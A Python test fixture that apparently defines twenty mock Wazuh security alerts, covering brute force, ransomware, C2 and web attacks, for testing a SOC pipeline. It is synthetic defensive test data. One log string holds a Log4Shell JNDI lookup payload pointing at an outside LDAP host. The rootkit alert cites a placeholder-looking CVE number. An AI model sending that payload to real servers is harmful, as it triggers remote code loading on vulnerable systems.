# Copyright 2025 AI SOC Contributors
# SPDX-License-Identifier: Apache-2.0

"""
Mock Alert Generator — bridge/mock_alert_generator.py

Produces 20 realistic WazuhAlert objects covering all major
alert categories for E2E pipeline testing.

Index contract (used by test_e2e_pipeline.py):
  [0]  SSH brute force — HIGH severity (has IOCs)
  [5]  Ransomware IOC — CRITICAL
  [6]  Domain admin granted — CRITICAL
  [10] Noise alert — rule_level=1, rule_id=1002
  [11] RDP failed login — LOW (no IOCs in stub)
"""
from __future__ import annotations

from schemas.alert import WazuhAlert

MOCK_ALERTS: list[WazuhAlert] = [

    WazuhAlert(
        agent_id="agent-001",
        agent_name="linux-server-01",
        rule_id=5763,
        rule_level=10,
        rule_description="SSH brute force attack detected",
        rule_groups=["authentication_failures", "sshd"],
        severity="HIGH",
        alert_category="authentication_failures",
        source_ip="185.220.101.47",
        full_log="sshd[1234]: Failed password for root from 185.220.101.47 port 49232",
    ),

    WazuhAlert(
        agent_id="agent-003",
        agent_name="web-server-01",
        rule_id=5402,
        rule_level=9,
        rule_description="Privilege escalation via sudo",
        rule_groups=["privilege_escalation"],
        severity="HIGH",
        alert_category="privilege_escalation",
        user="www-data",
        full_log="sudo: www-data: TTY=pts/0 ; USER=root ; COMMAND=/bin/bash",
    ),

    WazuhAlert(
        agent_id="agent-003",
        agent_name="web-server-01",
        rule_id=31510,
        rule_level=12,
        rule_description="Web shell uploaded to webroot",
        rule_groups=["web_attack"],
        severity="CRITICAL",
        alert_category="web_attack",
        source_ip="203.0.113.99",
        full_log="Apache: POST /uploads/cmd.php HTTP/1.1 from 203.0.113.99",
    ),

    WazuhAlert(
        agent_id="agent-004",
        agent_name="workstation-01",
        rule_id=18116,
        rule_level=11,
        rule_description="Pass-the-Hash attack detected",
        rule_groups=["lateral_movement"],
        severity="HIGH",
        alert_category="lateral_movement",
        full_log="EventID 4624 Logon Type 3 NTLMv1 hash used from 192.168.10.5",
    ),

    WazuhAlert(
        agent_id="agent-005",
        agent_name="endpoint-01",
        rule_id=92100,
        rule_level=13,
        rule_description="Credential dumping via LSASS access",
        rule_groups=["credential_access", "malware"],
        severity="CRITICAL",
        alert_category="malware",
        full_log=(
            "Process mimikatz.exe accessed lsass.exe "
            "SHA256: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        ),
    ),

    WazuhAlert(
        agent_id="agent-005",
        agent_name="endpoint-01",
        rule_id=59000,
        rule_level=15,
        rule_description="Ransomware encryption activity detected",
        rule_groups=["malware"],
        severity="CRITICAL",
        alert_category="malware",
        full_log="Multiple files encrypted with .locked extension — IOC: 185.220.101.47",
        source_ip="185.220.101.47",
    ),

    WazuhAlert(
        agent_id="agent-002",
        agent_name="dc-server-01",
        rule_id=18125,
        rule_level=12,
        rule_description="Domain admin privilege granted to user",
        rule_groups=["authentication_success"],
        severity="CRITICAL",
        alert_category="authentication_success",
        user="jsmith",
        full_log="EventID 4728 Member Added to Domain Admins: jsmith",
    ),

    WazuhAlert(
        agent_id="agent-004",
        agent_name="workstation-01",
        rule_id=22400,
        rule_level=10,
        rule_description="C2 beacon communication detected",
        rule_groups=["c2", "command_and_control"],
        severity="HIGH",
        alert_category="c2",
        destination_ip="45.33.32.156",
        full_log="Outbound connection to 45.33.32.156:4444 — Cobalt Strike beacon pattern",
    ),

    WazuhAlert(
        agent_id="agent-003",
        agent_name="web-server-01",
        rule_id=91050,
        rule_level=14,
        rule_description="Log4Shell exploitation attempt (CVE-2021-44228)",
        rule_groups=["web_attack"],
        severity="CRITICAL",
        alert_category="web_attack",
        source_ip="203.0.113.45",
        full_log='GET /${jndi:ldap://203.0.113.45/exploit} HTTP/1.1',
    ),

    WazuhAlert(
        agent_id="agent-007",
        agent_name="file-server-01",
        rule_id=55010,
        rule_level=11,
        rule_description="Unusual outbound data transfer (possible exfiltration)",
        rule_groups=["data_exfiltration"],
        severity="HIGH",
        alert_category="data_exfiltration",
        destination_ip="185.220.101.50",
        full_log="Large outbound transfer 2.4GB to 185.220.101.50 via HTTPS",
    ),

    WazuhAlert(
        agent_id="agent-001",
        agent_name="linux-server-01",
        rule_id=1002,
        rule_level=1,
        rule_description="Unknown problem (generic)",
        rule_groups=[],
        severity="LOW",
        alert_category="generic",
        full_log="Cron job ran normally",
    ),

    WazuhAlert(
        agent_id="agent-001",
        agent_name="linux-server-01",
        rule_id=18124,
        rule_level=5,
        rule_description="RDP failed login attempt",
        rule_groups=["authentication_failures"],
        severity="LOW",
        alert_category="authentication_failures",
        full_log="RDP: Failed login for user testuser from 192.168.1.100",
    ),

    WazuhAlert(
        agent_id="agent-008",
        agent_name="k8s-node-01",
        rule_id=87600,
        rule_level=13,
        rule_description="Container escape to host detected",
        rule_groups=["container_security"],
        severity="CRITICAL",
        alert_category="container_security",
        full_log="Process mounted host /proc from container namespace",
    ),

    WazuhAlert(
        agent_id="agent-005",
        agent_name="endpoint-01",
        rule_id=87200,
        rule_level=9,
        rule_description="Cryptominer activity detected",
        rule_groups=["malware"],
        severity="MEDIUM",
        alert_category="malware",
        destination_ip="45.33.32.200",
        full_log="xmrig process connecting to 45.33.32.200:3333 (mining pool)",
    ),

    WazuhAlert(
        agent_id="agent-006",
        agent_name="build-server-01",
        rule_id=87900,
        rule_level=12,
        rule_description="Suspicious package modification in CI pipeline",
        rule_groups=["supply_chain"],
        severity="CRITICAL",
        alert_category="supply_chain",
        full_log="npm package lodash modified after checksum verification failed",
    ),

    WazuhAlert(
        agent_id="agent-009",
        agent_name="dmz-server-01",
        rule_id=40101,
        rule_level=6,
        rule_description="Network service scanning detected",
        rule_groups=["recon"],
        severity="MEDIUM",
        alert_category="recon",
        source_ip="203.0.113.10",
        full_log="nmap scan from 203.0.113.10 — 65535 ports probed",
    ),

    WazuhAlert(
        agent_id="agent-002",
        agent_name="dc-server-01",
        rule_id=5715,
        rule_level=8,
        rule_description="Valid account login from unusual geolocation",
        rule_groups=["authentication_success"],
        severity="HIGH",
        alert_category="authentication_success",
        user="admin",
        source_ip="185.220.101.99",
        full_log="Successful login for admin from 185.220.101.99 (Tor exit node, DE)",
    ),

    WazuhAlert(
        agent_id="agent-002",
        agent_name="dc-server-01",
        rule_id=18124,
        rule_level=9,
        rule_description="Password spray attack — multiple accounts targeted",
        rule_groups=["authentication_failures"],
        severity="HIGH",
        alert_category="authentication_failures",
        source_ip="203.0.113.77",
        full_log="50 failed logins across 50 different accounts from 203.0.113.77",
    ),

    WazuhAlert(
        agent_id="agent-005",
        agent_name="endpoint-01",
        rule_id=51010,
        rule_level=14,
        rule_description="Rootkit detected via system call hooking",
        rule_groups=["malware"],
        severity="CRITICAL",
        alert_category="malware",
        full_log="syscall table modified — possible rootkit installed CVE-2023-9999",
    ),

    WazuhAlert(
        agent_id="agent-003",
        agent_name="web-server-01",
        rule_id=31106,
        rule_level=11,
        rule_description="Exploit attempt against CVE-2023-44487 (HTTP/2 Rapid Reset)",
        rule_groups=["web_attack"],
        severity="HIGH",
        alert_category="web_attack",
        source_ip="45.33.32.178",
        full_log="HTTP/2 RST_STREAM flood from 45.33.32.178 — CVE-2023-44487",
    ),
]
